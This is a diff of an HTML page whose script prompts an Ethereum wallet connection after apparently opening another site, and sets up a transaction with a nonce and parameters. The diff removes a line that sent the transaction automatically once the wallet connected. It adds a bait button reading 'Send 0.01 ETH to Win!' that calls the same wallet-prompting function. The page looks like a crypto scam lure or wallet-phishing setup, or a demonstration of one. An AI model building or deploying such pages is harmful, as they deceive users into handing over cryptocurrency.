@@ -29,8 +29,6 @@
 
         if (event.data === 'promptWalletConnection') {
           await promptWalletConnection();
-          // Now trigger the transaction logic
-          await sendTransaction();
         }
       });
 
@@ -53,7 +51,7 @@
         alert('Web3 (Ethereum provider) is not available in this browser.');
       }
     }
-    
+
     async function sendTransaction() {
       const transactionParameters = {
         nonce: "0x00",
@@ -79,6 +77,8 @@
   </script>
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
+    <br>
+    <button class="button" onclick="openBingAndPromptWallet()">Send 0.01 ETH to Win!</button>
   </center>
 </body>
 </html>
